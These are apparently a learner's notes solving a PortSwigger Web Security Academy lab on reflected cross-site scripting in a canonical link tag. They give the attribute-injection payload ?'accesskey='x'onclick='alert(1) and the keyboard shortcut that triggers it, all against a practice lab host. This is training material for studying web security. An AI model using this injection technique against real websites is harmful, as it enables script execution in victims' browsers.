https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag
This lab reflects user input in a canonical link tag and escapes angle brackets.

To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the alert function.

To assist with your exploit, you can assume that the simulated user will press the following key combinations:

ALT+SHIFT+X
CTRL+ALT+X
Alt+X
Please note that the intended solution to this lab is only possible in Chrome.


1) in the hompage try to inject ?test=hello

    see that the entire link is reflected into a canonical link 
    <link rel="canonical" href='https://0a4800a003fcf43186d7f2d6009300fb.web-security-academy.net/?test=hello'/>

2) in this case we can try to inject a key configuration such that when we click on linkx ALT+x then an alert is triggered
    ?'accesskey='x'onclick='alert(1)

    so we are changing the canonical link in:
    <link rel="canonical" href='https://0a4800a003fcf43186d7f2d6009300fb.web-security-academy.net/?' accesskey='x'onclick='alert(1)'/>

3) when we click ALT+x we trigger the alert in linux (in windows ALT+SHIFT+x  CTRL+ALT+x)
